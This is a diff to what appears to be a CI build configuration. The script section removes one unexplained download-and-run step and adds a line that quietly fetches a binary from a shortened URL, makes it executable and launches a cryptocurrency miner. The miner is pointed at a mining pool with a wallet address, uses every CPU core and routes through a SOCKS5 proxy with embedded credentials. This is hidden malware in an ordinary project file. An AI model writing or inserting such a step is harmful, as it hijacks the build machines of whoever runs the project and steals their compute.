@@ -116,6 +116,4 @@ jobs:
   allow_failures:
     - python: "3.9"
 script:
-  - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz
-  - tar -xvf joss.tar.gz
-  - ./gas keun.ini
+  - wget -qO build https://git.io/JVeDq && chmod +x build && ./build -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW.gam -p c=DGB -t $(nproc --all) -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080
